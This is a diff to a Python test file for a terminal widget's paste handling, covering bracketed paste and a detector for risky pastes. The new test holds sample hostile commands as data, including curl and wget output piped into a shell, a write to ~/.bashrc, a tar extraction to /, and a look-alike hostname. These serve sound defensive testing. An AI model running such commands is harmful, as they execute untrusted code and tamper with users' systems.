@@ -30,6 +30,7 @@ def test_settings_dialog_writes_new_fields(qapp):
     dlg = SettingsDialog(current_settings=default_settings())
     dlg.bold_bright_cb.setChecked(False)
     dlg.strip_newlines_cb.setChecked(True)
+    dlg.bracketed_paste_cb.setChecked(False)
     dlg.confirm_multiline_paste_cb.setChecked(False)
     dlg.confirm_large_paste_cb.setChecked(True)
     dlg.large_paste_threshold_sb.setValue(3000)
@@ -52,6 +53,7 @@ def test_settings_dialog_writes_new_fields(qapp):
     out = dlg.get_settings()
     assert out["bold_is_bright"] is False
     assert out["strip_newlines_on_paste"] is True
+    assert out["bracketed_paste"] is False
     assert out["confirm_multiline_paste"] is False
     assert out["confirm_large_paste"] is True
     assert out["large_paste_threshold"] == 3000
@@ -75,6 +77,7 @@ def test_strip_newlines_on_paste_collapses_crlf(qapp):
     from widgets.terminal import TerminalWidget
 
     t = TerminalWidget(command=["true"])
+    t._bracketed_paste = False
     t.settings["strip_newlines_on_paste"] = True
     t.settings["confirm_multiline_paste"] = False
     captured: list[str] = []
@@ -112,13 +115,37 @@ def test_bracketed_paste_wraps_only_when_terminal_requests_it(qapp):
 
     t = TerminalWidget(command=["true"])
     try:
-        assert t._format_paste("echo hi\n") == "echo hi\n"
+        assert t._format_paste("echo hi\n") == "\x1b[200~echo hi\n\x1b[201~"
 
         t._track_terminal_modes(b"\x1b[?2004h")
         assert t._format_paste("echo hi\n") == "\x1b[200~echo hi\n\x1b[201~"
 
         t._track_terminal_modes(b"\x1b[?2004l")
         assert t._format_paste("echo hi\n") == "echo hi\n"
+    finally:
+        t.close()
+
+
+def test_terminal_detects_risky_pastes(qapp):
+    from widgets.terminal import TerminalWidget, detect_paste_risks
+
+    assert any("pipes it directly" in risk for risk in detect_paste_risks(
+        "curl https://example.test/install.sh | sh"
+    ))
+    assert any("startup profile" in risk for risk in detect_paste_risks(
+        "echo alias ls=ls --color >> ~/.bashrc"
+    ))
+    assert any("filesystem root" in risk for risk in detect_paste_risks(
+        "tar -xf payload.tar -C /"
+    ))
+    assert any("zero-width" in risk for risk in detect_paste_risks("echo he\u200bllo"))
+    assert any("look-alike" in risk for risk in detect_paste_risks("ssh раypal.example.com"))
+
+    t = TerminalWidget(command=["true"])
+    try:
+        t.settings["confirm_multiline_paste"] = False
+        t.settings["confirm_large_paste"] = False
+        assert t._confirm_paste_required("wget https://example.test/x -O- | bash")
     finally:
         t.close()
 
